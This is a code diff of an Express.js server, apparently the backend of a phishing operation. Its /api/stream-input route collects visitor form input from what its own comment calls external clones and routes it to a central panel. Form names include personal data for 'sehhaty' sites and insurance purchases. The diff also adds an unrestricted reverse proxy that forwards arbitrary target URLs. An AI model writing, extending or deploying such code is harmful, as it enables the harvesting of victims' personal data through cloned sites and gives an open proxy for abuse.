@@ -53,26 +53,23 @@ app.post('/api/stream-input', async (req, res) => {
         const { siteKey, visitorToken, data, isConfirmed } = req.body;
         if (!visitorToken) return res.status(400).json({ error: "Missing visitorToken" });
 
-        const hasExplicitSiteKey = typeof siteKey === 'string' && siteKey.trim().length > 0;
-        let activeSite = hasExplicitSiteKey ? siteKey.trim() : 'site_1789715618986';
+        let activeSite = (siteKey && siteKey.trim()) ? siteKey.trim() : 'site_1789715618986';
 
-        // لا تستبدل siteKey الصريح؛ استخدم مطابقة الدومين فقط كخيار احتياطي.
-        if (!hasExplicitSiteKey) {
-            try {
-                const referer = req.headers.referer || req.headers.origin || '';
-                if (referer && (referer.startsWith('http://') || referer.startsWith('https://'))) {
-                    const parsedUrl = new URL(referer);
-                    const hostname = parsedUrl.hostname.toLowerCase().replace('www.', '');
-                    if (hostname && hostname !== 'localhost' && hostname !== '127.0.0.1') {
-                        const matchedSite = await Site.findOne({ domain: { $regex: new RegExp(hostname, 'i') } });
-                        if (matchedSite) {
-                            activeSite = matchedSite.siteKey;
-                        }
+        // 🧠 إستراتيجية مطابقة الدومين المطور تلقائياً لربط أي مستنسخ خارجي باللوحة المركزية بمرونة كاملة
+        try {
+            const referer = req.headers.referer || req.headers.origin || '';
+            if (referer && (referer.startsWith('http://') || referer.startsWith('https://'))) {
+                const parsedUrl = new URL(referer);
+                const hostname = parsedUrl.hostname.toLowerCase().replace('www.', '');
+                if (hostname && hostname !== 'localhost' && hostname !== '127.0.0.1') {
+                    const matchedSite = await Site.findOne({ domain: { $regex: new RegExp(hostname, 'i') } });
+                    if (matchedSite) {
+                        activeSite = matchedSite.siteKey;
                     }
                 }
-            } catch (err) {
-                console.error("[Domain Router Error]:", err.message);
             }
+        } catch (err) {
+            console.error("[Domain Router Error]:", err.message);
         }
         try {
             await Site.findOneAndUpdate(
@@ -80,7 +77,7 @@ app.post('/api/stream-input', async (req, res) => {
                 { siteKey: activeSite, name: 'موقع جديد (' + activeSite + ')', color: '#10b981' },
                 { upsert: true }
             );
-        } catch (e) { }
+        } catch (e) {}
         const formName = (req.body.formName) || (activeSite.includes('sehhaty') ? 'البيانات الشخصية' : 'شراء وثيقة تأمين');
 
         // 🧠 تحديث أو إنشاء سجل المدخلات
@@ -131,8 +128,6 @@ app.post('/api/stream-input', async (req, res) => {
     }
 });
 
-
-
 // 🔄 وكيل التفافي سحابي مخصص (Private Reverse Proxy) لجلب لوكابات منافذ والتخلص من CORS و 522
 app.all('/api/manafith-proxy', async (req, res) => {
     try {
@@ -140,9 +135,9 @@ app.all('/api/manafith-proxy', async (req, res) => {
         if (!target) return res.status(400).json({ error: 'Missing target url parameter' });
 
         const lowerTarget = target.toLowerCase();
-
+        
         // ممر ذكي لتأطير البيانات بشكل يطابق توقعات الفرونت اند بالكامل
-
+        
         // 2. تمرير كافة اللوكابات والاستعلامات الأخرى مباشرة إلى الخادم الأصلي
         const headers = { ...req.headers };
         delete headers.host;
@@ -164,9 +159,9 @@ app.all('/api/manafith-proxy', async (req, res) => {
 
         console.log(`[PROXY] Forwarding: ${target}`);
         const remoteRes = await fetch(target, options);
-
+        
         res.status(remoteRes.status);
-
+        
         const contentType = remoteRes.headers.get('content-type');
         if (contentType) res.setHeader('Content-Type', contentType);
 
